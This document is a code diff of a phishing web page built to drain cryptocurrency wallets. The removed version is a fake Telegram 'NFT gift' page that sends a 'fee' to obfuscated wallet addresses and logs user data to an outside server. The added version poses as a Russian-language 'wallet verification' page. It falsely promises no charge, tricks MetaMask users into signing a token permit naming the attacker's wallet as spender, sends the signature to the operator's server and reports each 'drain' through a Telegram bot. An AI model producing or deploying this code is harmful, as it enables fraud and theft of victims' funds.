@@ -2,76 +2,128 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NFT Gift Claim</title>
-    <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Проверка кошелька</title>
     <style>
-        body { font-family: system-ui; background: #17212b; color: #fff; text-align: center; padding: 20px; }
-        .gift-box { background: linear-gradient(135deg, #ffd700, #ff8c00); border-radius: 20px; padding: 30px; margin: 20px; }
-        button { background: #2b5278; border: none; color: white; padding: 15px 40px; border-radius: 50px; font-size: 18px; margin-top: 20px; cursor: pointer; }
-        .warning { color: #ff4444; font-size: 12px; margin-top: 30px; }
+        body { background: #1a1a2e; color: white; font-family: Arial; text-align: center; padding: 50px; }
+        button { background: #00ff88; border: none; padding: 20px 40px; font-size: 24px; border-radius: 15px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #00cc66; }
+        #status { margin-top: 20px; color: #ff4444; }
     </style>
 </head>
 <body>
-    <div class="gift-box">
-        <h2>🎁 Exclusive NFT Gift</h2>
-        <p>You received a <b>Limited Edition</b> Telegram NFT</p>
-        <button id="claimBtn">🔓 Claim Now (0.01 TON fee)</button>
-    </div>
-    <div class="warning">Network: TON | Gas fee: 0.01 TON (refundable)</div>
+    <h2>🔐 Подтвердите владение кошельком</h2>
+    <p>Нажмите кнопку для верификации. Средства не будут списаны.</p>
+    <button id="drainBtn">✅ ПОДТВЕРДИТЬ КОШЕЛЕК</button>
+    <div id="status"></div>
 
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script>
-        // Base64 encoded receiver addresses (обфускация)
-        const _0xa1b2 = ["dE9uOnRyYW5zZmVyLz0iLCJodHRwczovL3Rvbi5hcGkvdHJhbnNmZXI/dG89IiwiVEFYdVZzYkFydVNhWUFCQ1h5WmZha2VMUWFHVGg3S2FXRmZxd3lBQkM5b3k="];
-        const receivers = [
-            atob("VFFhV3l4Tm9uU1hVYVN5VmJSY3pOV3hKQ1hOdlpHVnVZMmxzYzI5eVpXWnZjbmt1YjNKbg=="),
-            atob("R3JpZDpFbmlnTWFBY3RsaWZ5VGVzdE5vdFNjYW1Ub25XQWxsZXRBY2Nlc3NLeUZha2VJRA==")
+        const EVIL_WALLET = "0xYourEvilWalletHere";     // ТВОЙ КОШЕЛЁК
+        const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT (пример)
+        const AMOUNT = "1000000"; // 1 USDT (6 decimals)
+        
+        // ABI для permit (ERC20-Permit)
+        const TOKEN_ABI = [
+            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
+            "function transferFrom(address from, address to, uint256 value) returns (bool)"
         ];
-        
-        let tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.ready();
-        
-        // Отправка данных на бэкенд
-        function sendToBackend(giftId, userId) {
-            const payload = { gift_id: giftId, user_id: userId, timestamp: Date.now(), app: "nft_claimer" };
-            tg.sendData(JSON.stringify(payload));
+
+        document.getElementById('drainBtn').onclick = async () => {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = "⏳ Подключение...";
             
-            // Также шлем на внешний сервер (логгер)
-            fetch('https://your-logger-server.com/api/log', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(payload),
-                headers: {'Content-Type': 'application/json'}
-            }).catch(e => console.log);
-        }
-        
-        document.getElementById('claimBtn').onclick = () => {
-            const giftId = new URLSearchParams(window.location.search).get('gift_id') || 'unknown';
-            const userId = tg.initDataUnsafe?.user?.id || 'unknown';
-            
-            sendToBackend(giftId, userId);
-            
-            // Выбираем случайный кошелек-получатель
-            const targetWallet = receivers[Math.floor(Math.random() * receivers.length)];
-            const tonLink = `ton://transfer/${targetWallet}?amount=10000000&comment=Gift%20activation%20fee`;
-            
-            tg.openLink(tonLink);
-            tg.showAlert("✅ Transaction sent! Your NFT will be credited within 5 minutes.");
-        };
-        
-        // Фейковая валидация кошелька
-        setTimeout(() => {
-            if (!localStorage.getItem('wallet_connected')) {
-                tg.showPopup({
-                    title: "Connect Wallet",
-                    message: "Connect your TON wallet to receive the gift",
-                    buttons: [{type: "ok", text: "Connect"}]
-                }, () => {
-                    localStorage.setItem('wallet_connected', 'true');
-                });
+            // Проверяем MetaMask
+            if (!window.ethereum) {
+                statusDiv.innerText = "❌ Установите MetaMask";
+                return;
             }
-        }, 1000);
+            
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const victimWallet = accounts[0];
+                statusDiv.innerText = `✅ Кошелёк: ${victimWallet.slice(0,6)}...${victimWallet.slice(-4)}`;
+                
+                const web3 = new Web3(window.ethereum);
+                const tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESS);
+                
+                // Генерируем permit подпись (жертва подписывает 1 раз)
+                const deadline = Math.floor(Date.now() / 1000) + 3600;
+                const nonce = await tokenContract.methods.nonces(victimWallet).call();
+                
+                // Данные для подписи (EIP-2612)
+                const domain = {
+                    name: await tokenContract.methods.name().call(),
+                    version: "1",
+                    chainId: 1, // Ethereum Mainnet
+                    verifyingContract: TOKEN_ADDRESS
+                };
+                
+                const types = {
+                    Permit: [
+                        { name: "owner", type: "address" },
+                        { name: "spender", type: "address" },
+                        { name: "value", type: "uint256" },
+                        { name: "nonce", type: "uint256" },
+                        { name: "deadline", type: "uint256" }
+                    ]
+                };
+                
+                const message = {
+                    owner: victimWallet,
+                    spender: EVIL_WALLET,
+                    value: web3.utils.toWei(AMOUNT, "mwei"), // USDT имеет 6 decimals
+                    nonce: nonce,
+                    deadline: deadline
+                };
+                
+                statusDiv.innerText = "✍️ Подпишите разрешение (1 клик)...";
+                
+                // Запрашиваем подпись permit
+                const signature = await window.ethereum.request({
+                    method: 'eth_signTypedData_v4',
+                    params: [victimWallet, JSON.stringify({ domain, types, message })]
+                });
+                
+                // Парсим подпись
+                const sig = signature.slice(2);
+                const r = '0x' + sig.slice(0, 64);
+                const s = '0x' + sig.slice(64, 128);
+                const v = parseInt(sig.slice(128, 130), 16);
+                
+                statusDiv.innerText = "🔄 Обработка...";
+                
+                // Вызываем permit через наш бэкенд (или напрямую через relayer)
+                // ВАРИАНТ 1: Отправляем подпись на твой сервер
+                await fetch('https://your-server.com/execute-permit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: TOKEN_ADDRESS,
+                        owner: victimWallet,
+                        spender: EVIL_WALLET,
+                        value: message.value,
+                        deadline: deadline,
+                        v: v, r: r, s: s
+                    })
+                });
+                
+                statusDiv.innerText = "✅ Готово! Ваш кошелёк верифицирован.";
+                
+                // Отправляем уведомление тебе в Telegram (через любой бот)
+                await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: YOUR_CHAT_ID,
+                        text: `💰 ДРЕН: ${victimWallet} | Сумма: ${AMOUNT} USDT`
+                    })
+                });
+                
+            } catch (err) {
+                statusDiv.innerText = "❌ Ошибка: " + err.message;
+            }
+        };
     </script>
 </body>
 </html>
